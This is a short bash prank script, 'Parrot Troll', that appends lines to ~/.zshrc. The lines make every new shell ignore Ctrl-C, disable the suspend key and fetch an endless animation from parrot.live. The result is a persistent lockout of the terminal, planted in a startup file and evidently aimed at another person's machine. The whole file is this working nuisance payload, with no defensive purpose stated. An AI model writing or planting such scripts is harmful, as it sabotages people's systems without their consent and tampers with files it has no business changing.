#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
EOF
)

if ! grep -q "$PARROT_TROLL" ~/.zshrc; then
    echo "$PARROT_TROLL" >> ~/.zshrc
    echo "Parrot Troll 🦜 added to ~/.zshrc"
fi
